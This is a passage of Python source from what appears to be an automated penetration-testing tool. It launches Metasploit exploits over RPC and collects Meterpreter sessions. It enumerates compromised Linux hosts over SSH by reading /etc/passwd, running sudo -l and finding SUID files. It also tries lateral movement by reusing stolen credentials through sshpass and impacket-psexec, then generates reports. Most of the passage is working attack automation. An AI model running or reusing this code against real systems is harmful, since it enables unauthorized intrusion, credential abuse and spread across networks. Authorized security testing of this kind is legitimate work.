                        results["exploits_attempted"].append({
                            'host': svc['host'],
                            'port': svc['port'],
                            'module': msf_config['module'],
                            'status': 'identified_no_rpc'
                        })
                        self._append_log(f"[MSF] Module identified (MSF RPC not available)")

    def _get_msf_client(self):
        """Get Metasploit RPC client if available"""
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            # Try to connect to local msfrpcd
            client = MsfRpcClient('msf', port=55553, ssl=False)
            self._append_log("[MSF] Connected to Metasploit RPC")
            return client
        except Exception as e:
            self._append_log(f"[MSF] RPC not available: {str(e)[:50]}")
            return None

    def _run_msf_exploit(self, client, svc: Dict, config: Dict, results: Dict) -> bool:
        """Run a Metasploit exploit via RPC"""
        try:
            exploit = client.modules.use('exploit', config['module'])
            exploit['RHOSTS'] = svc['host']
            exploit[config['port_option']] = int(svc['port'])

            # Set payload
            payload = client.modules.use('payload', config['payload'])
            payload['LHOST'] = '0.0.0.0'  # Listen on all interfaces
            payload['LPORT'] = 4444

            # Execute
            job_id = exploit.execute(payload=payload)
            self._append_log(f"[MSF] Launched job {job_id}")

            # Wait briefly for session
            import time
            time.sleep(5)

            # Check for sessions
            sessions = client.sessions.list
            if sessions:
                for sid, session in sessions.items():
                    if session.get('target_host') == svc['host']:
                        self._append_log(f"[MSF] SESSION OBTAINED: {sid}")

                        self.shells_obtained.append({
                            'host': svc['host'],
                            'type': 'meterpreter',
                            'session_id': sid,
                            'access_level': 'system'
                        })

                        self._create_finding(
                            title=f"Metasploit Exploit Success - {config['module']}",
                            description=f"Successfully exploited {svc['host']} using {config['module']}",
                            severity="critical",
                            target=svc['host'],
                            port=str(svc['port']),
                            service=svc.get('service', 'unknown'),
                            tool_name="metasploit"
                        )

                        results["exploits_attempted"].append({
                            'host': svc['host'],
                            'port': svc['port'],
                            'module': config['module'],
                            'status': 'success',
                            'session_id': sid
                        })
                        return True

            results["exploits_attempted"].append({
                'host': svc['host'],
                'port': svc['port'],
                'module': config['module'],
                'status': 'no_session'
            })
            return False

        except Exception as e:
            self._append_log(f"[MSF] Exploit error: {str(e)[:100]}")
            return False

    def _enumerate_linux_host(self, shell: Dict) -> Dict:
        """Enumerate a Linux host via SSH"""
        results = {}
        host = shell['host']
        username = shell['username']
        password = shell['password']

        commands = {
            'users': 'cat /etc/passwd | grep -v nologin | grep -v false',
            'sudo': 'sudo -l 2>/dev/null || echo "no sudo"',
            'suid': 'find / -perm -4000 2>/dev/null | head -20',
            'network': 'ip addr; netstat -tulpn 2>/dev/null || ss -tulpn',
            'processes': 'ps aux | head -30'
        }

        for name, cmd in commands.items():
            try:
                ssh_cmd = [
                    'sshpass', '-p', password,
                    'ssh', '-o', 'StrictHostKeyChecking=no',
                    f'{username}@{host}',
                    cmd
                ]
                process = subprocess.Popen(ssh_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, _ = process.communicate(timeout=30)
                results[name] = stdout
                self._append_log(f"[ENUM] {host} - {name}: collected")
            except:
                pass

        return results

    def _enumerate_windows_host(self, shell: Dict) -> Dict:
        """Enumerate a Windows host"""
        results = {}
        # Would use impacket or similar for Windows enumeration
        self._append_log(f"[ENUM] Windows enumeration on {shell['host']}")
        return results

    def _try_lateral_movement(self, target_host: str, cred: Dict) -> bool:
        """Try to use credentials on another host"""
        self._append_log(f"[LATERAL] Trying {cred['username']} on {target_host}")

        username = cred['username']
        password = cred['password']

        # Check if target has SSH
        target_has_ssh = any(
            s['host'] == target_host and s['service'] in ['ssh', 'openssh']
            for s in self.discovered_services
        )

        # Check if target has SMB
        target_has_smb = any(
            s['host'] == target_host and (s['service'] in ['smb', 'netbios-ssn'] or s['port'] in ['445', '139'])
            for s in self.discovered_services
        )

        # Try SSH first
        if target_has_ssh:
            try:
                cmd = [
                    'sshpass', '-p', password,
                    'ssh', '-o', 'StrictHostKeyChecking=no',
                    '-o', 'ConnectTimeout=5',
                    '-o', 'BatchMode=no',
                    f'{username}@{target_host}',
                    'whoami'
                ]
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate(timeout=10)

                if process.returncode == 0 and stdout.strip():
                    self._append_log(f"[LATERAL] SUCCESS! SSH to {target_host} as {username}")

                    self._create_finding(
                        title=f"Lateral Movement Success - SSH",
                        description=f"Successfully moved from {cred['host']} to {target_host} using reused credentials",
                        severity="critical",
                        target=target_host,
                        port="22",
                        service="ssh",
                        evidence=f"Original compromise: {cred['host']}\nReused creds: {username}",
                        tool_name="sshpass"
                    )

                    # Add new shell
                    self.shells_obtained.append({
                        'host': target_host,
                        'type': 'ssh',
                        'username': username,
                        'password': password,
                        'access_level': 'user',
                        'lateral_from': cred['host']
                    })
                    return True

            except Exception as e:
                pass

        # Try SMB/psexec
        if target_has_smb:
            try:
                cmd = ['impacket-psexec', f'{username}:{password}@{target_host}', 'whoami']
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate(timeout=15)

                if process.returncode == 0 or username.lower() in stdout.lower():
                    self._append_log(f"[LATERAL] SUCCESS! SMB to {target_host}")

                    self._create_finding(
                        title=f"Lateral Movement Success - SMB/PSExec",
                        description=f"Successfully moved from {cred['host']} to {target_host} using reused credentials via PSExec",
                        severity="critical",
                        target=target_host,
                        port="445",
                        service="smb",
                        evidence=f"Original compromise: {cred['host']}\nReused creds: {username}",
                        tool_name="impacket"
                    )

                    self.shells_obtained.append({
                        'host': target_host,
                        'type': 'psexec',
                        'username': username,
                        'password': password,
                        'access_level': 'system',
                        'lateral_from': cred['host']
                    })
                    return True

            except Exception:
                pass

        return False

    def _get_findings_summary(self) -> Dict[str, int]:
        """Get summary of findings by severity"""
        summary = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for finding in self.findings:
            sev = finding.severity.value.lower() if hasattr(finding.severity, 'value') else str(finding.severity).lower()
            if sev in summary:
                summary[sev] += 1
        return summary

    def _generate_reports(self, results: Dict):
        """Auto-generate reports after pentest completion"""
        try:
            from app.services.report_generator import ReportGenerator
            from app.models.report import ReportType, ReportFormat

            self._append_log("[REPORT] Generating pentest reports...")

            report_gen = ReportGenerator(self.scan_id)

            # Generate HTML report
            html_result = report_gen.generate(ReportType.FULL, ReportFormat.HTML)
            if html_result.get('success'):
                self._append_log(f"[REPORT] HTML report: {html_result.get('file_path')}")

            # Generate JSON report
            json_result = report_gen.generate(ReportType.FULL, ReportFormat.JSON)
            if json_result.get('success'):
                self._append_log(f"[REPORT] JSON report: {json_result.get('file_path')}")

            # Try PDF (may fail if dependencies missing)
            try:
                pdf_result = report_gen.generate(ReportType.FULL, ReportFormat.PDF)
                if pdf_result.get('success'):
                    self._append_log(f"[REPORT] PDF report: {pdf_result.get('file_path')}")
            except Exception as e:
                self._append_log(f"[REPORT] PDF generation skipped: {str(e)[:50]}")

            self._append_log("[REPORT] Report generation complete")

        except Exception as e:
            self._append_log(f"[REPORT] Failed to generate reports: {str(e)}")
